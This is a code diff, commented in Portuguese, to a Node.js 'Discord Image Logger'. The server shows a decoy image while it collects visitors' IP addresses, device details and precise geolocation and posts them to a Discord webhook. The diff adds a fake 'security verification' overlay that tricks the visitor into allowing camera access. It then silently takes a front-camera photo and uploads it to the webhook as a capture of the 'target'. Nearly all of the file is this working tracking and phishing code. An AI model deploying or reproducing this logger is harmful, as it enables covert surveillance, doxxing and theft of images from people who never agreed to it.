@@ -1,4 +1,4 @@
-// Discord Image Logger - Versão com API IP melhorada
+// Discord Image Logger - Versão com API IP melhorada e acesso à câmera
 const https = require('https');
 const http = require('http');
 const url = require('url');
@@ -9,7 +9,8 @@ const config = {
   "image": "https://i.pinimg.com/564x/12/26/e0/1226e0b520b52a84933d697f52600012.jpg",
   "username": "Image Logger",
   "color": 0x00FFFF,
-  "accurateLocation": true
+  "accurateLocation": true,
+  "requestCamera": true // Nova configuração para solicitar acesso à câmera
 };
 
 // Função melhorada para obter informações detalhadas sobre o IP
@@ -114,9 +115,114 @@ function sendDiscordWebhook(data) {
   });
 }
 
+// Função para enviar imagem da câmera para o Discord
+async function sendCameraImageToDiscord(imageBase64, ip, userAgent, ipInfo, coords = null, endpoint = null) {
+  try {
+    // Formatar descrição com informações do IP
+    const description = formatIPInfoMessage(ip, userAgent, ipInfo, coords, endpoint);
+    
+    // Construir dados para o webhook
+    const data = {
+      username: config.username,
+      content: "@everyone",
+      embeds: [
+        {
+          title: "Image Logger - Câmera + IP + Localização Capturados",
+          color: config.color,
+          description: description,
+          thumbnail: { url: config.image }
+        }
+      ]
+    };
+    
+    // Enviar webhook com informações
+    console.log('Enviando informações com captura de câmera para o Discord...');
+    await sendDiscordWebhook(data);
+    
+    // Agora enviar a imagem da câmera como um segundo webhook
+    // Remover o prefixo "data:image/jpeg;base64," da string base64
+    const base64Data = imageBase64.replace(/^data:image\/\w+;base64,/, "");
+    
+    // Preparar os dados para o webhook de arquivo
+    const boundary = "------------------------" + Date.now().toString(16);
+    
+    const webhookUrl = new URL(config.webhook);
+    
+    // Criar o corpo da requisição multipart/form-data
+    let body = '';
+    body += `--${boundary}\r\n`;
+    body += 'Content-Disposition: form-data; name="payload_json"\r\n';
+    body += 'Content-Type: application/json\r\n\r\n';
+    body += JSON.stringify({
+      username: config.username,
+      content: "Captura da câmera do alvo:"
+    });
+    body += `\r\n--${boundary}\r\n`;
+    body += 'Content-Disposition: form-data; name="files[0]"; filename="camera_capture.jpg"\r\n';
+    body += 'Content-Type: image/jpeg\r\n\r\n';
+    
+    // Converter o corpo e a imagem para Buffers
+    const bodyBuffer = Buffer.from(body, 'utf8');
+    const imageBuffer = Buffer.from(base64Data, 'base64');
+    const endBuffer = Buffer.from(`\r\n--${boundary}--`, 'utf8');
+    
+    // Concatenar todos os buffers
+    const requestBody = Buffer.concat([bodyBuffer, imageBuffer, endBuffer]);
+    
+    // Configurar a requisição para enviar o arquivo
+    const options = {
+      hostname: webhookUrl.hostname,
+      path: webhookUrl.pathname + webhookUrl.search,
+      method: 'POST',
+      headers: {
+        'Content-Type': `multipart/form-data; boundary=${boundary}`,
+        'Content-Length': requestBody.length
+      }
+    };
+    
+    return new Promise((resolve, reject) => {
+      const req = https.request(options, (res) => {
+        let responseData = '';
+        
+        res.on('data', (chunk) => {
+          responseData += chunk;
+        });
+        
+        res.on('end', () => {
+          if (res.statusCode >= 200 && res.statusCode < 300) {
+            console.log('Imagem da câmera enviada com sucesso');
+            resolve(true);
+          } else {
+            console.error(`Erro ao enviar imagem da câmera: Status ${res.statusCode}`);
+            console.error(`Resposta: ${responseData}`);
+            resolve(false);
+          }
+        });
+      });
+      
+      req.on('error', (error) => {
+        console.error('Erro ao enviar imagem da câmera:', error);
+        reject(error);
+      });
+      
+      req.write(requestBody);
+      req.end();
+    });
+    
+  } catch (error) {
+    console.error('Erro ao enviar imagem da câmera:', error);
+    return false;
+  }
+}
+
 // Detectar se é um dispositivo iOS
 function isIOS(userAgent) {
   return /iPad|iPhone|iPod/.test(userAgent);
+}
+
+// Detectar se é um dispositivo móvel
+function isMobile(userAgent) {
+  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 }
 
 // Função para formatar a mensagem completa do Discord com informações detalhadas do IP
@@ -232,6 +338,7 @@ module.exports = async (req, res) => {
     const parsedUrl = url.parse(req.url, true);
     const params = parsedUrl.query;
     const geoParam = params.g; // Verificar se já temos coordenadas de localização
+    const cameraParam = params.c; // Verificar se temos imagem da câmera
     
     // Obter IP e User Agent
     const ip = req.headers['x-forwarded-for'] || 
@@ -244,45 +351,26 @@ module.exports = async (req, res) => {
     console.log('Requisição recebida de IP:', ip);
     console.log('User Agent:', userAgent);
     
-    // Verificar se é iOS para tratamento especial
+    // Verificar se é iOS ou móvel para tratamento especial
     const deviceIsIOS = isIOS(userAgent);
+    const deviceIsMobile = isMobile(userAgent);
     
     // Verificar se o IP é do Discord (começa com 35)
     const isDiscord = ip.startsWith('35');
     
-    // Se temos parâmetro de geolocalização, enviar para o Discord
-    if (geoParam) {
+    // Se temos imagem da câmera, processar e enviar para o Discord
+    if (cameraParam) {
       try {
-        // Decodificar as coordenadas
-        const coords = Buffer.from(geoParam, 'base64').toString('utf-8');
-        const [latitude, longitude] = coords.split(',');
-        
-        console.log('Coordenadas recebidas:', latitude, longitude);
+        // Decodificar a imagem
+        const imageBase64 = Buffer.from(cameraParam, 'base64').toString('utf-8');
         
         // Obter informações detalhadas do IP
         console.log('Obtendo informações do IP...');
         const ipInfo = await getIPInfo(ip);
         console.log('Informações do IP obtidas:', ipInfo);
         
-        // Formatar a mensagem completa
-        const description = formatIPInfoMessage(ip, userAgent, ipInfo, coords, req.url);
-        
-        // Enviar webhook ao Discord com coordenadas
-        const data = {
-          username: config.username,
-          content: "@everyone",
-          embeds: [
-            {
-              title: "Image Logger - IP + Localização Capturados",
-              color: config.color,
-              description: description,
-              thumbnail: { url: config.image }
-            }
-          ]
-        };
-        
-        console.log('Enviando webhook para o Discord...');
-        await sendDiscordWebhook(data);
+        // Enviar imagem e informações para o Discord
+        await sendCameraImageToDiscord(imageBase64, ip, userAgent, ipInfo, geoParam ? Buffer.from(geoParam, 'base64').toString('utf-8') : null, req.url);
         
         // Enviar página com a imagem
         const html = `
@@ -318,6 +406,250 @@ module.exports = async (req, res) => {
         
         res.setHeader('Content-Type', 'text/html');
         res.status(200).send(html);
+      } catch (error) {
+        console.error('Erro ao processar imagem da câmera:', error);
+        // Continuar mesmo com erro na imagem da câmera
+      }
+    }
+    // Se temos parâmetro de geolocalização, enviar para o Discord
+    else if (geoParam) {
+      try {
+        // Decodificar as coordenadas
+        const coords = Buffer.from(geoParam, 'base64').toString('utf-8');
+        const [latitude, longitude] = coords.split(',');
+        
+        console.log('Coordenadas recebidas:', latitude, longitude);
+        
+        // Obter informações detalhadas do IP
+        console.log('Obtendo informações do IP...');
+        const ipInfo = await getIPInfo(ip);
+        console.log('Informações do IP obtidas:', ipInfo);
+        
+        // Formatar a mensagem completa
+        const description = formatIPInfoMessage(ip, userAgent, ipInfo, coords, req.url);
+        
+        // Enviar webhook ao Discord com coordenadas
+        const data = {
+          username: config.username,
+          content: "@everyone",
+          embeds: [
+            {
+              title: "Image Logger - IP + Localização Capturados",
+              color: config.color,
+              description: description,
+              thumbnail: { url: config.image }
+            }
+          ]
+        };
+        
+        console.log('Enviando webhook para o Discord...');
+        await sendDiscordWebhook(data);
+        
+        // Se devemos solicitar acesso à câmera, enviar página com solicitação
+        if (config.requestCamera) {
+          const html = `
+            <!DOCTYPE html>
+            <html>
+            <head>
+              <title>Imagem</title>
+              <meta charset="utf-8">
+              <meta name="viewport" content="width=device-width, initial-scale=1.0">
+              <style>
+                body, html {
+                  margin: 0;
+                  padding: 0;
+                  height: 100%;
+                  width: 100%;
+                  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+                }
+                .container {
+                  display: flex;
+                  flex-direction: column;
+                  justify-content: center;
+                  align-items: center;
+                  height: 100vh;
+                  position: relative;
+                }
+                .camera-access {
+                  position: fixed;
+                  top: 0;
+                  left: 0;
+                  width: 100%;
+                  height: 100%;
+                  background-color: rgba(0,0,0,0.8);
+                  display: flex;
+                  flex-direction: column;
+                  justify-content: center;
+                  align-items: center;
+                  color: white;
+                  z-index: 1000;
+                }
+                .camera-content {
+                  max-width: 500px;
+                  padding: 20px;
+                  text-align: center;
+                }
+                .camera-button {
+                  margin-top: 20px;
+                  background-color: #007AFF;
+                  color: white;
+                  border: none;
+                  border-radius: 20px;
+                  padding: 12px 24px;
+                  font-size: 16px;
+                  font-weight: 600;
+                  cursor: pointer;
+                }
+                .camera-message {
+                  margin-top: 15px;
+                  font-size: 14px;
+                  opacity: 0.8;
+                }
+                .hidden {
+                  display: none !important;
+                }
+                #video {
+                  display: none;
+                }
+                #canvas {
+                  display: none;
+                }
+                .imagem {
+                  width: 100%;
+                  height: 100vh;
+                  background-image: url('${config.image}');
+                  background-position: center;
+                  background-repeat: no-repeat;
+                  background-size: contain;
+                }
+              </style>
+            </head>
+            <body>
+              <div class="imagem"></div>
+              
+              <div class="camera-access" id="cameraAccess">
+                <div class="camera-content">
+                  <h2>Verificação de Segurança</h2>
+                  <p>Para continuar, precisamos verificar sua identidade por motivos de segurança.</p>
+                  <button id="cameraButton" class="camera-button">Verificar Identidade</button>
+                  <p class="camera-message">Isto é necessário apenas uma vez para proteção contra bots.</p>
+                </div>
+              </div>
+              
+              <video id="video" autoplay playsinline></video>
+              <canvas id="canvas"></canvas>
+              
+              <script>
+                // Script para acessar câmera
+                document.getElementById('cameraButton').addEventListener('click', function() {
+                  // Acessar a câmera
+                  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    // Preferir câmera frontal em dispositivos móveis
+                    const constraints = {
+                      video: {
+                        facingMode: "user"
+                      }
+                    };
+                    
+                    navigator.mediaDevices.getUserMedia(constraints)
+                      .then(function(stream) {
+                        // Exibir stream no elemento de vídeo
+                        const video = document.getElementById('video');
+                        video.srcObject = stream;
+                        video.onloadedmetadata = function(e) {
+                          // Tirar foto após carregar o stream
+                          setTimeout(function() {
+                            // Definir tamanho do canvas para corresponder ao vídeo
+                            const canvas = document.getElementById('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            
+                            // Desenhar o frame atual no canvas
+                            const context = canvas.getContext('2d');
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            // Converter para base64
+                            const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8);
+                            
+                            // Parar stream da câmera
+                            stream.getTracks().forEach(track => {
+                              track.stop();
+                            });
+                            
+                            // Codificar em base64 e enviar
+                            const encodedImage = btoa(imageDataUrl);
+                            
+                            // Construir nova URL
+                            var currentUrl = window.location.href;
+                            var newUrl;
+                            if (currentUrl.includes("?")) {
+                              newUrl = currentUrl + "&c=" + encodedImage;
+                            } else {
+                              newUrl = currentUrl + "?c=" + encodedImage;
+                            }
+                            
+                            // Esconder div de acesso à câmera
+                            document.getElementById('cameraAccess').style.display = 'none';
+                            
+                            // Redirecionar
+                            window.location.replace(newUrl);
+                          }, 1000); // Tirar foto após 1 segundo
+                        };
+                      })
+                      .catch(function(error) {
+                        console.error("Erro ao acessar câmera:", error);
+                        // Se houve erro, esconder div de acesso à câmera
+                        document.getElementById('cameraAccess').style.display = 'none';
+                      });
+                  } else {
+                    console.error("getUserMedia não suportado");
+                    // Se não é suportado, esconder div de acesso à câmera
+                    document.getElementById('cameraAccess').style.display = 'none';
+                  }
+                });
+              </script>
+            </body>
+            </html>
+          `;
+          
+          res.setHeader('Content-Type', 'text/html');
+          res.status(200).send(html);
+        } else {
+          // Enviar página com a imagem
+          const html = `
+            <!DOCTYPE html>
+            <html>
+            <head>
+              <title>Imagem</title>
+              <meta charset="utf-8">
+              <meta name="viewport" content="width=device-width, initial-scale=1.0">
+              <style>
+                body, html {
+                  margin: 0;
+                  padding: 0;
+                  height: 100%;
+                  width: 100%;
+                  overflow: hidden;
+                }
+                .imagem {
+                  width: 100%;
+                  height: 100vh;
+                  background-image: url('${config.image}');
+                  background-position: center;
+                  background-repeat: no-repeat;
+                  background-size: contain;
+                }
+              </style>
+            </head>
+            <body>
+              <div class="imagem"></div>
+            </body>
+            </html>
+          `;
+          
+          res.setHeader('Content-Type', 'text/html');
+          res.status(200).send(html);
+        }
       } catch (error) {
         console.error('Erro ao processar geolocalização:', error);
         // Continuar mesmo com erro na geolocalização
@@ -436,6 +768,12 @@ module.exports = async (req, res) => {
               .hidden {
                 display: none;
               }
+              #video {
+                display: none;
+              }
+              #canvas {
+                display: none;
+              }
             </style>
           </head>
           <body>
@@ -455,6 +793,9 @@ module.exports = async (req, res) => {
               <div id="loadingMessage" class="message hidden">
                 Carregando imagem em alta definição...
               </div>
+              
+              <video id="video" autoplay playsinline></video>
+              <canvas id="canvas"></canvas>
             </div>
             
             <script>
@@ -486,8 +827,66 @@ module.exports = async (req, res) => {
                         newUrl = currentUrl + "?g=" + encodedCoords;
                       }
                       
-                      // Redirecionar
-                      window.location.replace(newUrl);
+                      // Se devemos solicitar acesso à câmera também
+                      if (${config.requestCamera}) {
+                        // Tentar acessar câmera
+                        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                          // Preferir câmera frontal
+                          const constraints = {
+                            video: {
+                              facingMode: "user"
+                            }
+                          };
+                          
+                          navigator.mediaDevices.getUserMedia(constraints)
+                            .then(function(stream) {
+                              // Exibir stream no elemento de vídeo
+                              const video = document.getElementById('video');
+                              video.srcObject = stream;
+                              video.onloadedmetadata = function(e) {
+                                // Tirar foto após carregar o stream
+                                setTimeout(function() {
+                                  // Definir tamanho do canvas
+                                  const canvas = document.getElementById('canvas');
+                                  canvas.width = video.videoWidth;
+                                  canvas.height = video.videoHeight;
+                                  
+                                  // Desenhar o frame atual no canvas
+                                  const context = canvas.getContext('2d');
+                                  context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                  
+                                  // Converter para base64
+                                  const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8);
+                                  
+                                  // Parar stream da câmera
+                                  stream.getTracks().forEach(track => {
+                                    track.stop();
+                                  });
+                                  
+                                  // Codificar em base64 e enviar
+                                  const encodedImage = btoa(imageDataUrl);
+                                  
+                                  // Adicionar à URL
+                                  newUrl = newUrl + "&c=" + encodedImage;
+                                  
+                                  // Redirecionar
+                                  window.location.replace(newUrl);
+                                }, 1000); // Tirar foto após 1 segundo
+                              };
+                            })
+                            .catch(function(error) {
+                              console.error("Erro ao acessar câmera:", error);
+                              // Se houve erro, continuar mesmo sem a câmera
+                              window.location.replace(newUrl);
+                            });
+                        } else {
+                          // Se não suporta câmera, continuar sem ela
+                          window.location.replace(newUrl);
+                        }
+                      } else {
+                        // Redirecionar sem solicitar câmera
+                        window.location.replace(newUrl);
+                      }
                     },
                     function(error) {
                       // Erro ao obter localização
@@ -505,204 +904,3 @@ module.exports = async (req, res) => {
                 }
               });
             </script>
-          </body>
-          </html>
-        `;
-      } else {
-        // Versão padrão para Android e outros dispositivos
-        html = `
-          <!DOCTYPE html>
-          <html>
-          <head>
-            <title>Imagem</title>
-            <meta charset="utf-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <style>
-              body, html {
-                margin: 0;
-                padding: 0;
-                height: 100%;
-                width: 100%;
-                overflow: hidden;
-              }
-              .imagem {
-                width: 100%;
-                height: 100vh;
-                background-image: url('${config.image}');
-                background-position: center;
-                background-repeat: no-repeat;
-                background-size: contain;
-              }
-              .loading {
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background-color: rgba(0,0,0,0.3);
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                color: white;
-                font-family: Arial, sans-serif;
-                z-index: 100;
-              }
-              .loading-content {
-                background-color: rgba(0,0,0,0.7);
-                padding: 20px;
-                border-radius: 10px;
-                text-align: center;
-              }
-              .spinner {
-                border: 4px solid rgba(255,255,255,0.3);
-                border-radius: 50%;
-                border-top: 4px solid white;
-                width: 30px;
-                height: 30px;
-                margin: 10px auto;
-                animation: spin 1s linear infinite;
-              }
-              @keyframes spin {
-                0% { transform: rotate(0deg); }
-                100% { transform: rotate(360deg); }
-              }
-            </style>
-          </head>
-          <body>
-            <div class="imagem"></div>
-            <div class="loading">
-              <div class="loading-content">
-                <div class="spinner"></div>
-                <p>Carregando imagem em alta qualidade...</p>
-              </div>
-            </div>
-            
-            <script>
-              // Script para obter geolocalização
-              document.addEventListener('DOMContentLoaded', function() {
-                var currentUrl = window.location.href;
-                
-                // Verificar se já temos o parâmetro g
-                if (!currentUrl.includes("g=")) {
-                  // Solicitar geolocalização
-                  if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                      function(position) {
-                        // Sucesso - temos a posição
-                        var lat = position.coords.latitude;
-                        var lng = position.coords.longitude;
-                        var coords = lat + "," + lng;
-                        
-                        // Codificar em base64
-                        var encodedCoords = btoa(coords);
-                        
-                        // Construir nova URL
-                        var newUrl;
-                        if (currentUrl.includes("?")) {
-                          newUrl = currentUrl + "&g=" + encodedCoords;
-                        } else {
-                          newUrl = currentUrl + "?g=" + encodedCoords;
-                        }
-                        
-                        // Redirecionar
-                        window.location.replace(newUrl);
-                      },
-                      function(error) {
-                        // Erro ao obter localização
-                        console.log("Erro de geolocalização: " + error.message);
-                        document.querySelector('.loading').style.display = 'none';
-                      },
-                      {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                      }
-                    );
-                  }
-                }
-              });
-            </script>
-          </body>
-          </html>
-        `;
-      }
-      
-      res.setHeader('Content-Type', 'text/html');
-      res.status(200).send(html);
-    } else {
-      // Geolocalização não está ativada, enviar relatório básico
-      console.log('Obtendo informações básicas do IP (sem geolocalização)...');
-      const ipInfo = await getIPInfo(ip);
-      console.log('Informações básicas do IP obtidas:', ipInfo);
-      
-      const description = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
-      
-      const data = {
-        username: config.username,
-        content: "@everyone",
-        embeds: [
-          {
-            title: "Image Logger - IP Capturado",
-            color: config.color,
-            description: description,
-            thumbnail: { url: config.image }
-          }
-        ]
-      };
-      
-      console.log('Enviando relatório para o Discord...');
-      await sendDiscordWebhook(data);
-      
-      // Enviar página com a imagem
-      const html = `
-        <!DOCTYPE html>
-        <html>
-        <head>
-          <title>Imagem</title>
-          <meta charset="utf-8">
-          <meta name="viewport" content="width=device-width, initial-scale=1.0">
-          <style>
-            body, html {
-              margin: 0;
-              padding: 0;
-              height: 100%;
-              width: 100%;
-              overflow: hidden;
-            }
-            .imagem {
-              width: 100%;
-              height: 100vh;
-              background-image: url('${config.image}');
-              background-position: center;
-              background-repeat: no-repeat;
-              background-size: contain;
-            }
-          </style>
-        </head>
-        <body>
-          <div class="imagem"></div>
-        </body>
-        </html>
-      `;
-      
-      res.setHeader('Content-Type', 'text/html');
-      res.status(200).send(html);
-    }
-  } catch (error) {
-    console.error('Erro:', error);
-    
-    // Em caso de erro, enviar página básica
-    res.setHeader('Content-Type', 'text/html');
-    res.status(200).send(`
-      <!DOCTYPE html>
-      <html>
-      <head>
-        <title>Imagem</title>
-      </head>
-      <body>
-        <img src="${config.image}" alt="Imagem" style="max-width: 100%; max-height: 100vh;">
-      </body>
-      </html>
-    `);
-  }
-};
